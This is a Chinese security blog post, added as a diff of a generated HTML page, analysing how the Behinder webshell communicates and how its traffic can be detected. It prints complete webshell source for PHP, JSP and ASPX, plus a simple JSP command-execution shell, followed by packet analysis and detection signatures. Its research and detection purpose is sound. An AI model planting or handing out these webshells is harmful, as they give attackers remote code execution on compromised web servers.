@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="shell分析phpshell.php 123456789101112131415161718192021222324252627282930313233&amp;lt;?php@error_reporting(0);session_start();if (isset($_GET[&apos;pass&apos;]))&amp;#123;    $key=substr(md5(uniqid(rand())),16);    $_SE">
+<meta name="keywords" content="webshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="冰蝎通信研究">
+<meta property="og:url" content="https://wh0ale.github.io/2019/09/23/冰蝎通信研究/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="shell分析phpshell.php 123456789101112131415161718192021222324252627282930313233&amp;lt;?php@error_reporting(0);session_start();if (isset($_GET[&apos;pass&apos;]))&amp;#123;    $key=substr(md5(uniqid(rand())),16);    $_SE">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_20-19-42.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-24_17-45-13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-24_17-52-52.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-29_11-50-29.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-29_12-52-41.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-24_19-10-49.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-26_15-58-46.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_14-11-07.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_14-13-10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-26_16-14-06.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-26_16-31-27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_16-30-54.png">
+<meta property="og:updated_time" content="2019-10-21T10:55:32.399Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="冰蝎通信研究">
+<meta name="twitter:description" content="shell分析phpshell.php 123456789101112131415161718192021222324252627282930313233&amp;lt;?php@error_reporting(0);session_start();if (isset($_GET[&apos;pass&apos;]))&amp;#123;    $key=substr(md5(uniqid(rand())),16);    $_SE">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_20-19-42.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/09/23/冰蝎通信研究/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>冰蝎通信研究 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/09/23/冰蝎通信研究/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">冰蝎通信研究
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-23 19:42:54" itemprop="dateCreated datePublished" datetime="2019-09-23T19:42:54+08:00">2019-09-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-10-21 18:55:32" itemprop="dateModified" datetime="2019-10-21T18:55:32+08:00">2019-10-21</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.8k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="shell分析"><a href="#shell分析" class="headerlink" title="shell分析"></a>shell分析</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    $_SESSION[<span class="string">'k'</span>]=$key;</span><br><span class="line">    <span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[<span class="string">'k'</span>];</span><br><span class="line">	$post=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">		$post=$t($post.<span class="string">""</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, <span class="string">"AES128"</span>, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p)</span> </span>&#123;<span class="keyword">eval</span>($p.<span class="string">""</span>);&#125;&#125;</span><br><span class="line">	@<span class="keyword">new</span> C($params);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在该冰蝎木马查看是$_GET 变量否存在<code>pass</code>，如果存在的话根据时间生成16位的随机密钥存入session中</p>
+<p>接着判断是否开启了<code>openssl</code>插件</p>
+<ul>
+<li>如果开启了<code>openssl</code>，使用AES进行加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串<code>assert|eval(&quot;phpinfo();&quot;)</code>，服务端利用explode函数将拆分为一个字符串数据，然后以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)。</li>
+<li>如果没有开启openssl，进行异或处理然后通过base64加密</li>
+</ul>
+<h2 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"pass"</span>)!=<span class="keyword">null</span>)&#123;String k=(<span class="string">""</span>+UUID.randomUUID()).replace(<span class="string">"-"</span>,<span class="string">""</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">"u"</span>,k);out.print(k);<span class="keyword">return</span>;&#125;Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">"u"</span>)+<span class="string">""</span>).getBytes(),<span class="string">"AES"</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在冰蝎客户端连接shell时候，首先进行一次GET请求，远程获取加密密钥进行AES加密，获得密钥保存到session中，和当前会话绑定。</p>
+<p>客户端将payload的类打包好，通过ASM框架从jar包中以字节流的形式取出class文件。服务端通过ClassLoader的子类Myloader的get方法来间接调用defineClass方法，将客户端发来的二进制class字节数组解析成Class并实例化。</p>
+<p>客户端使用GET请求获得的密钥对paylod进行AES加密然后进行base64编码，带cookie以POST方式发送至服务器端，并将执行结果取回（如果结果是加密的，则进行AES解密）。服务端会通过客户端传来cookie值的session获得客户端的密钥进行解密。</p>
+<h2 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null)&#123; Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;&#125;byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上面的木马思路差不多，都是动态AES加密传输WEBSHELL。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_20-19-42.png" alt></p>
+<blockquote>
+<p>为了实现客户端跨平台使用，冰蝎的客户端采用Java语言编写，因此就无法动态编译C#的dll文件。而是在windows平台把C#版本的Payload编译成dll文件，然后以资源文件的形式嵌入至客户端。&#39;;&#39;</p>
+<ul>
+<li>客户端把参数值拼接在DLL文件的底部，然后一起进行AES加密，加密之后传递到服务端。</li>
+<li>服务端收到加密字节流之后进行AES解密，并把解密的内容（包括DLL字节流和参数字节流）传入System.Reflection.Assembly.Load，由于Assembly的解析特性，会自动忽略掉DLL文件尾部的额外参数字节流。</li>
+<li>执行流进入Payload的Equals函数，在函数中由于可以访问Request和Session，于是用Session中的key对Requset中的完整加密字节流再次解密。</li>
+<li>解密得到DLL文件字节流和额外参数字节流，然后只要把DLL尾部附加的额外参数字节流取出来，便可得到客户端传过来的额外参数。</li>
+</ul>
+</blockquote>
+<h1 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h1><h2 id="php-1"><a href="#php-1" class="headerlink" title="php"></a>php</h2><p>开启openssl或者关闭openssl在流量上都会先发送两次GET握手请求，服务端产生随机密钥并写入Session，session和当前会话绑定。不同的客户端访问同一个服务端，密钥不同。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-24_17-45-13.png" alt></p>
+<p>然后接着进行两次post请求，在第一次post请求的时候，开启了openssl拓展的在进行post请求时会获得到响应</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-24_17-52-52.png" alt></p>
+<p>对post请求进行解密</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-29_11-50-29.png" alt></p>
+<p>对post响应解密</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-29_12-52-41.png" alt></p>
+<p>base64解码后的结果：</p>
+<p><code>{&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;f2c02e9f-3185-406e-bb71-8f217123c755&quot;}</code></p>
+<p>没有开启openssl拓展的会在第二次post请求异或加密数据然后进行base64函数处理</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-24_19-10-49.png" alt></p>
+<h2 id="jsp-1"><a href="#jsp-1" class="headerlink" title="jsp"></a>jsp</h2><p>简单jsp一句话流量如下</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-26_15-58-46.png" alt></p>
+<p>冰蝎对于webshell会进行两次GET请求，获得密钥保存到session中，和当前会话绑定。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_14-11-07.png" alt></p>
+<p>客户端使用GET请求获得的密钥对paylod进行AES加密然后进行base64编码，带cookie以POST方式发送至服务器端。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_14-13-10.png" alt></p>
+<h2 id="aspx-1"><a href="#aspx-1" class="headerlink" title="aspx"></a>aspx</h2><p>简单aspx一句话流量如下</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-26_16-14-06.png" alt></p>
+<p>Java和.NET原生都支持AES加密，加密流程和jsp木马一样，具体数据包如下</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-26_16-31-27.png" alt></p>
+<h1 id="流量监测"><a href="#流量监测" class="headerlink" title="流量监测"></a>流量监测</h1><h2 id="php-2"><a href="#php-2" class="headerlink" title="php"></a>php</h2><p>基于GET请求包的检测特征：</p>
+<ol>
+<li>url包含<code>.php?pass=</code>；（密码如果被修改后，此检测特征无效）</li>
+<li>请求body包含<code>Content-Length: 16</code></li>
+</ol>
+<p>基于GET响应包的检测特征：返回16位密钥</p>
+<p>基于POST请求包的检测特征：<code>Content-Type: application/x-www-form-urlencoded</code></p>
+<p>基于POST响应包的检测特征：<code>Transfer-Encoding: chunked</code></p>
+<h2 id="jsp-2"><a href="#jsp-2" class="headerlink" title="jsp"></a>jsp</h2><p>基于GET请求包的检测特征：</p>
+<ol>
+<li>url包含<code>.php?pass=</code>；（密码如果被修改后，此检测特征无效）</li>
+<li>请求body包含<code>Content-Length: 16</code></li>
+</ol>
+<p>基于GET响应包的检测特征：返回16位密钥</p>
+<p>基于POST请求包的检测特征：<code>Content-Type: application/octet-stream</code></p>
+<p>基于POST响应包的检测特征：<code>Transfer-Encoding: chunked</code></p>
+<p>百度的OpenRASP可以通过命令执行的<strong>堆栈日志</strong>识别冰蝎（安装自带插件即可看到日志），日志中会看到应用大量的堆栈跟踪活动记录。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_16-30-54.png" alt></p>
+<h2 id="aspx-2"><a href="#aspx-2" class="headerlink" title="aspx"></a>aspx</h2><p>基于GET请求包的检测特征：</p>
+<ol>
+<li>url包含<code>.php?pass=</code>；（密码如果被修改后，此检测特征无效）</li>
+<li>请求body包含<code>Content-Length: 16</code></li>
+</ol>
+<p>基于GET响应包的检测特征：返回16位密钥</p>
+<p>基于POST请求包的检测特征：<code>Content-Type: application/octet-stream</code></p>
+<p>基于POST响应包的检测特征：<code>Transfer-Encoding: chunked</code></p>
+<p>参考：</p>
+<p><a href="https://www.freebuf.com/column/157013.html" target="_blank" rel="noopener">几种典型 JSP WebShell 的深度解析</a></p>
+<p><a href="https://xz.aliyun.com/u/8697" target="_blank" rel="noopener">先知上冰蝎系列文章</a></p>
+<p><a href="https://www.4hou.com/technology/2301.html" target="_blank" rel="noopener">如何全面防御Webshell</a></p>
+<p><a href="https://mp.weixin.qq.com/s/vnDytPBUP72hoFfSOzES2A" target="_blank" rel="noopener">JNI技术绕过rasp防护实现jsp webshell</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA3NTQ3ODI0NA==&mid=2247485066&idx=1&sn=8f56f5c6ec1abf1ba823e22ae71893db&chksm=9f6ea301a8192a17ae01d136584b7cea0a3e1efdab81e3ef057b287d3ff29dcdaff934c45440&scene=21#wechat_redirect" target="_blank" rel="noopener">那些年我们堵住的洞 – OpenRASP纪实</a></p>
+<p><a href="https://github.com/SkyBlueEternal/Machine-Learning-Bayesian-Algorithm-Packet-Inspection-webshell-discover" target="_blank" rel="noopener">基于机器学习和流量检测的webshell检测程序</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/09/23/冰蝎通信研究/" title="冰蝎通信研究">https://wh0ale.github.io/2019/09/23/冰蝎通信研究/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/webshell/" rel="tag"><i class="fa fa-tag"></i># webshell</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/09/15/ios-to-Android/" rel="next" title="ios to Android">
+                <i class="fa fa-chevron-left"></i> ios to Android
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/09/24/phpstudy-rce/" rel="prev" title="phpstudy rce">
+                phpstudy rce <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
